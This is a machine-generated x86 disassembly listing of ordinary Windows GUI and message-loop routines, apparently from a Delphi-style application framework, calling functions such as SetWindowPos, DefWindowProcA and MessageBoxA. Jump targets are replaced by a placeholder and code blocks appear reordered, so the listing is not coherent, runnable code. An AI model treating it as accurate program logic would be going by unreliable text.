cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_46799c
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4188a0
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_467b24
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4188a0
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_467bc0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40cbb4
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_466b4c
mov eax [ rw-data ]
call sub_467194
sub_467c18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467c75
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467c7c
lea eax [ ebp - 0x4 ]
call sub_404164
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_40435c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_467c84
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_467cc0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_468410
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_467d0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4683c6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_467bc0
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_468e2c
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_4188a0
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_44f7b4
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_469d58
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_468948
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4688ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_44f7b4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_468410
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_467194
push ebp
call sub_467c84
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_467c84
pop ecx
jmp [ eax * 4 + jump_table_467db0 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_44f7b4
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4687c4
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45410c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_467c18
push ebp
call sub_467c84
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_467c84
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_467c84
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_420a50
jmp r-xdata
xor eax eax
call sub_45fac4
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_44f7b4
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_44a180
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46842c
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_467c84
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_46534c
jmp r-xdata
push ebp
call sub_467c84
pop ecx
jmp r-xdata
push ebp
call sub_467cc0
pop ecx
jmp r-xdata
push ebp
call sub_467c84
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_467b24
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4684dc
jmp r-xdata
jmp r-xdata
call sub_43aed8
call sub_43afb8
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_467b14
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_467b24
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_467b1c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_45f974
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_467c84
pop ecx
jmp r-xdata
call sub_45fa28
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_467c84
pop ecx
jmp r-xdata
call sub_43aed8
call sub_43b014
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d55c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_46842c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_467b14
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_467414
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_44f7b4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_44f7b4
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_4684dc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_467414
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_44f7b4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_467b24
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_44f7b4
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_4630d8
mov eax [ ebx + 0x44 ]
call sub_4654f4
sub_4685dc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_468618
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_4041b8
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404254
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_468664
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_468688
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_4686d8
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_445e6c
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_44f7b4
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_468790
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_4696f0
sub_4687c4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_44f7b4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_403564
test al al
jne r-xdata
sub_468830
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_468790
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_468688
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_4686d8
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_468664
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_4688c8
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_468830
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_469198
sub_4688ec
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_418880
mov eax 0x8
call sub_4026ec
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_418744
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_468948
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4188a0
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_40270c
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_418790
jmp r-xdata
sub_4689dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_403830#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_44f790
mov [ esi + 0x44 ] edi
sub_468a5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_468b3a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_45f8ec
call sub_408030
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b41
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_4630d8
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_468b01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4688c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_461fe0
mov eax [ ebp - 0x4 ]
call sub_46842c
jmp r-xdata
sub_468b5c
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40277c
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40279c
push eax
call sub_40277c
pop edx
call sub_40ba74
call sub_40277c
mov edx [ rw-data ]
call sub_4034f4
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40277c
mov edx eax
mov eax ebx
call sub_468d54
pop esi
pop ebx
retn
call sub_40277c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_468bec
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_45f974
mov [ ebp - 0x10 ] eax
call sub_45f890
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_467b90
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_468d41
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468d48
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_45fa28
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_45f898
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_468d54
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
